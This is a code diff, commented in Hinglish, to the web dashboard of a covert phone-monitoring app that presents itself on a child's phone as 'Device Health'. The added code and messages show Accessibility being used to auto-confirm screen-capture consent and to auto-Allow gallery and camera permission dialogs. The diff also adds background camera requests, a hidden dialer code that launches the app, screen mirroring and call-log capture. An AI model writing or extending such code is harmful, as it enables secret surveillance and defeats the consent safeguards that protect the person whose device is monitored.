@@ -5,8 +5,10 @@
 // Saare PURANA-app checks isi se chalte hain (banner, phone check, watchdog).
 // v1.10/vc11: FIXED signing key — pehle har CI build ka debug keystore alag
 // hota tha, isliye koi bhi update install-over-existing kabhi nahi hota tha.
-const LATEST_VC = 11;
-const LATEST_V = "1.10";
+// v1.11/vc12: camera permission background auto-request (CameraPermActivity) +
+// Phone check me Gallery/Camera permission rows + health me gallery flag.
+const LATEST_VC = 12;
+const LATEST_V = "1.11";
 
 const S = {
   token: localStorage.getItem("fg_token") || "",
@@ -281,7 +283,8 @@ function renderStatus() {
   const labels = {
     service: "Background service", accessibility: "Accessibility", admin: "Device admin",
     location: "Location", usageAccess: "Usage access", overlay: "Overlay",
-    camera: "Camera", notifListener: "Notifications", batteryOk: "Battery exemption", mic: "Microphone"
+    camera: "Camera", notifListener: "Notifications", batteryOk: "Battery exemption", mic: "Microphone",
+    gallery: "Gallery"
   };
   const broken = h ? Object.keys(labels).filter((k) => h[k] === false).map((k) => labels[k]) : [];
   const el = $("s-health");
@@ -1404,6 +1407,12 @@ function renderMirrorDiag(d) {
   rows.push(diagRow(d.screenOn === true, "Bachche ki screen", d.screenOn ? "ON ✓" : "OFF — frames isliye nahi aa rahe", d.screenOn ? "" : "Phone screen ON karo, frames khud aane lagenge"));
   rows.push(diagRow(h.mirrorReady === true, "Screen capture consent", h.mirrorReady ? "granted ✓" : "abhi nahi", h.mirrorReady ? "" : "Mirror shuru dabao — dialog khud khulega aur confirm hoga"));
   rows.push(diagRow(h.accessibility !== false, "Accessibility", h.accessibility === false ? "OFF" : "ON ✓", h.accessibility === false ? "Settings → Accessibility → Device Health → ON (consent auto-confirm isi se hota hai)" : ""));
+  // FRESH-INSTALL DIAG (vc12): gallery/camera permission rows — teeno features
+  // (mirror/gallery/camera) accessibility par depend karte hain; pehle Phone
+  // check me ye rows the hi nahi isliye parent ko pata nahi chalta tha ki kya
+  // missing hai.
+  if (typeof d.galleryPerm === "boolean") rows.push(diagRow(d.galleryPerm, "Gallery permission", d.galleryPerm ? "granted ✓" : "NAHI MILI — gallery isliye khaali hai", d.galleryPerm ? "" : "Live tab → “📸 Gallery kholo” dobara dabao — dialog khud khulega aur auto-Allow hoga (a11y ON ho to)"));
+  if (typeof d.cameraPerm === "boolean") rows.push(diagRow(d.cameraPerm, "Camera permission", d.cameraPerm ? "granted ✓" : "NAHI MILI — selfie/back cam isliye fail", d.cameraPerm ? "" : "Quick actions me “📷 Back cam” dobara dabao — permission dialog khud Allow ho jayega (a11y ON ho to)"));
   rows.push(diagRow(h.overlay !== false, "Display over apps", h.overlay === false ? "OFF" : "ON ✓", h.overlay === false ? "Settings → Apps → Device Health → Display over other apps → Allow" : ""));
   rows.push(diagRow(h.canInstall !== false, "Install unknown apps", h.canInstall === false ? "OFF (auto-update nahi hoga)" : "ON ✓", h.canInstall === false ? "Settings → Apps → Device Health → Install unknown apps → Allow" : ""));
   if (typeof d.frames === "number") rows.push("<li>🎞 <b>Frames (is session):</b> " + d.frames + (d.lastFrameAgoSec != null ? " · last frame " + d.lastFrameAgoSec + "s pehle" : "") + "</li>");
@@ -1419,7 +1428,9 @@ function renderMirrorDiag(d) {
   let verdict;
   if (vc !== null && vc < LATEST_VC) verdict = "👉 <b>Sabse badi dikkat: PURANA app (build " + vc + "). Mirror/Gallery/Call-log fixes naye build me hi hain — pehle update karo.</b>";
   else if (d.screenOn === false) verdict = "👉 <b>Screen OFF hai. Bachche ka phone ON karo — frames 1–2 sec me khud aayenge.</b>";
-  else if (h.accessibility === false) verdict = "👉 <b>Accessibility OFF hai — consent dialog khud confirm nahi ho payega. Wo ON karo, phir Mirror band karke dobara shuru karo.</b>";
+  else if (h.accessibility === false) verdict = "👉 <b>Accessibility OFF hai — consent dialog khud confirm nahi ho payega AUR gallery/camera auto-Allow bhi nahi hoga. Wo ON karo, phir Mirror band karke dobara shuru karo.</b>";
+  else if (d.galleryPerm === false) verdict = "👉 <b>Gallery permission nahi mili — Live tab me “📸 Gallery kholo” dobara dabao: permission dialog khud khulega aur auto-Allow ho jayega (5 sec me).</b>";
+  else if (d.cameraPerm === false) verdict = "👉 <b>Camera permission nahi mili — Quick actions me “📷 Back cam” dobara dabao: dialog khud Allow ho jayega, phir shot lag jayega.</b>";
   else if (h.overlay === false) verdict = "👉 <b>Display over apps OFF hai — background me consent khulti hi nahi. Allow karo, phir dobara try karo.</b>";
   else if (d.consentPending && d.consentUiSeen === false) verdict = "👉 <b>Consent dialog bachche ke phone par khula HI nahi (OEM ne block kiya). Bachche ke phone par Device Health app ek baar kholo (dial *#*#2724#*#*), phir Live tab se Mirror dobara shuru karo.</b>";
   else if (d.consentPending) verdict = "👉 <b>Consent abhi confirm ho raha hai — 10 sec ruko. Phir bhi screen na aaye to Mirror band karke dobara shuru karo.</b>";
